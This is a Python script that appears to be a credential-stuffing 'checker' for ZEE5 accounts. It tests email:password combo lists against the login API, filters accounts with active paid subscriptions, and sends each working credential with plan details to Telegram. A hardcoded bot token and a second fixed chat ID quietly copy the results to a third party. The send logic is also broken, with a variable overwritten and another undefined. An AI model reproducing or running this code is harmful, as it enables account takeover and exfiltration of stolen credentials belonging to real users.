import os 
hc = os.environ.get("HITS")
import requests,subprocess,sys,termcolor,base64
def crack():
    telegram_url='https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id='+hc+'&text='
    telegram_url2='https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='
    print('')
    file_path = input('heh')
    from datetime import date
    today = date.today()
    d1 = today.strftime("%Y/%m/%d")
    d1=d1.replace('/','-')
    file=open(file_path,'rb')
    data=file.readlines()
    length=str(len(data))
    headers={
        "Pragma": "no-cache",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
        }
    hit_num=0
    line_num=1
    print(termcolor.colored('\n=================| Cracking Started |=================\n','yellow'))
    for line in data:
        try:
            line=line.decode()
        except:
            continue
        try:
            combo=line.split(':')
            email=combo[0].strip()
            password=combo[1].strip()
        except:
            continue
        
        try:
            current='[ '+str(line_num)+' ] » '+email+':'+password
            line_num=line_num+1
            print(termcolor.colored(current,'red'))
            s=requests.Session()
            res=s.get('https://userapi.zee5.com/v1/user/loginemail?email='+email+'&password='+password,headers=headers)
            if 'The email address and password combination was wrong during login.' in res.text:
                
                continue
            
            elif 'token' in res.text:
                token=dict(res.json())
                token=token["token"]
                headers1={
                    "Referer": 'https://www.zee5.com/myaccount/plans\"',
                    "X-Z5-AppPlatform": "Web Desktop" ,
                    "X-Z5-Appversion": "15.27.11",
                    'authorization': 'bearer '+token
                    }
                res=s.get('https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true',headers=headers1)
                if 'Amazon Free Trial Pack For 7 Days' in res.text:
                    continue
                elif '"state":"activated"' in res.text:
                    res=str(res.content.decode())
                    expiry=res[int(res.index('"subscription_end":"')):int(res.index('","state":"activated"'))]
                    expiry=expiry.replace('"subscription_end":"','')
                    expiry=expiry[:10]
                    if int(expiry[:4])<int(d1[:4]):
                        continue
                    if int(expiry[:4])==int(d1[:4]):
                        if int(expiry[5:7])<int(d1[5:7]):
                            continue
                        elif int(expiry[5:7])==int(d1[5:7]):
                            if int(expiry[8:])<=int(d1[8:]):
                                continue
                    print(termcolor.colored('Hit Found!','green'))
                    renewal=res[int(res.index('"recurring":')):int(res.index(',"payment_providers":'))]
                    renewal=renewal.replace('"recurring":','')
                    devices=res[int(res.index('mber_of_supported_devices":')):int(res.index(',"movie_audio'))]
                    devices=devices.replace('mber_of_supported_devices":','')
                    title=res[int(res.index('original_title":"')):int(res.index('","system"'))]
                    title=title.replace('original_title":"','')
                    country=res[int(res.index('"country":"')):int(res.index('","countries'))]
                    country=country.replace('"country":"','')
                    hit_num=hit_num+1
                    hit='Email: '+email+' | Password: '+password+' | Country: '+country+' | Pack: '+title+' | Auto Renewal: '+renewal+' | Number Of Supported Devices: '+devices+' | Zee 5 Checker'
                    final_url=telegram_url+hit
                    final_url=telegram_url2+hit
                    requests.post(final_url)
                    requests.post(final_url2)
                else:
                    continue
            else:
                continue
        except:
            continue
    print(termcolor.colored('\n================| Cracking Completed |================','yellow'))
    sys.exit()
crack()